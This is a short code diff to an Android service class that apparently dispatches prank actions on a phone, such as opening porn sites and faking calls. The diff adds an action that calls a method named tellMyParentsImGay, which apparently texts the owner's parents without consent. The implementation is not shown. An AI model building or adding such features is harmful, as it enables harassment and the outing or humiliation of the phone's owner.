@@ -39,6 +39,7 @@ public class JobsIntentService extends IntentService {
     public static final String ACTION_WEB_PORN = "ACTION_WEB_PORN";
     public static final String ACTION_WALLPAPER = "ACTION_WALLPAPER";
     public static final String ACTION_FAKE_PHONE_CALL = "ACTION_FAKE_PHONE_CALL";
+    public static final String ACTION_TEXT_PARENTS = "ACTION_TEXT_PARENTS";
 
     public JobsIntentService() {
         super("JobsIntentService");
@@ -170,6 +171,8 @@ public class JobsIntentService extends IntentService {
                 timer.schedule(timerTask, 1000L, 60000L);
             }else if(intent.getAction().equals(ACTION_FAKE_PHONE_CALL)){
                 Lofl.fakePhoneCall(this);
+            }else if(intent.getAction().equals(ACTION_TEXT_PARENTS)){
+                Lofl.tellMyParentsImGay(this);
             }else{
                 Log.d(TAG, "No action found!");
             }
